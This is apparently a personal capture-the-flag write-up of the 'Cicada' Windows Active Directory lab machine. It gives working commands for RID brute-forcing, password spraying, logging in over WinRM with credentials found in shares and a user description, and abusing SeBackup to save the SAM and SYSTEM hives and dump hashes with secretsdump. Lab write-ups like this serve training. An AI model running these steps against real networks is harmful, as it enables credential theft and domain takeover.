---
Status: Done
OS: Windows AD
Difficulty: Easy
tags:
  - SMB
  - SeBackup
  - SeRestore
Date: 2026-07-05T01:07:00
Owned: 2026-07-05T02:41:00
---

---
# Enumeration
## port scan
rust scan  
usual port open for AD environments, LDAP, SMB ...  
![[Pasted image 20260705011130.png]]

## SMB  

can read HR shares using guest access  
![[Pasted image 20260705011214.png]]
access using smbclient  
```sh
impacket-smbclient cicada.htb/a@10.129.231.149 -no-pass
```
![[Pasted image 20260705011349.png]]
inside HR share  
![[Pasted image 20260705011453.png]]
get the file and check the content  
![[Pasted image 20260705011553.png]]
there is default password, currently we do not have user list  
we should spray the password with every account since it is the default password  

# Michael
## enumerate users
```
smb 10.129.231.149 -u a -p  --users --log test
smb 10.129.231.149 -u a -p  --rid-brute --log rid.txt
```
we don't get any user from --users  
but do get some from --rid-brute  
![[Pasted image 20260705012127.png]]
```
cat rid.txt | grep "SidTypeUser" | cut -d "\\" -f2 | cut -d " " -f1 > users.txt
```
![[Pasted image 20260705012750.png]]
since we have user now let's spray with the default password we found  
```
nxc smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```
![[Pasted image 20260705013011.png]]
the password is valid on one account `michael.wrightson`
imma spray on other service with this cred as well  
![[Pasted image 20260705014621.png]]
normal, let's check the smb again if we have anything more juicy  
![[Pasted image 20260705014912.png]]
now we have READ access on NETLOGON and SYSVOL  
there is nothing in NETLOGON but SYSVOL o_O  
![[Pasted image 20260705015132.png]]
Am I foreshadowing  
![[Pasted image 20260705015452.png]]
hmm  
![[Pasted image 20260705015518.png]]
At this point I think we would need to use the cred we found to do kerberoast then we get some account maybe emily...  

tried kerberoast both using nxc and impacket, no entry found...  

maybe i need to try emily account with default password on different service since I have sprayed only SMB->not valid  

I think I missed some file on the SYSVOL  
rechecked nothing useful  


# David
we can enum users again with credential we previously enum using guest session  
```sh
nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
bingo!  
![[Pasted image 20260705021803.png]]
there is password for another user in the description field  
![[Pasted image 20260705022027.png]]
checking SMB permission with new cred  
this time we can access DEV shares which has backup script  
![[Pasted image 20260705022312.png]]
there is another plaintext cred in the script :D  
`emily.oscars:Q!3@Lp#M6b*7t*Vt`

emily should have remote permission from what we found earlier in the policy from SYSVOL share (SeInteractiveLogonRight)  

let's see, just recheck  
![[Pasted image 20260705022540.png]]

# Emily
connect to winrm  
```sh
evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
get the user flag  
![[Pasted image 20260705022751.png]]


# Administrator

checking priv  
![[Pasted image 20260705022854.png]]
there is SeBackup and SeRestore  
![[Pasted image 20260705023017.png]]
also member of Backup Operators  

with the Se priv we got we can get SAM and SYSTEM
```sh
cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
```
![[Pasted image 20260705023258.png]]
success  
![[Pasted image 20260705023327.png]]
download them  
![[Pasted image 20260705023720.png]]
then we secretdump  
```sh
impacket-secretsdump -sam SAM -system SYSTEM local
```
![[Pasted image 20260705023825.png]]
connect with winrm  
![[Pasted image 20260705024011.png]]
get the flag  
![[Pasted image 20260705024053.png]]
done!  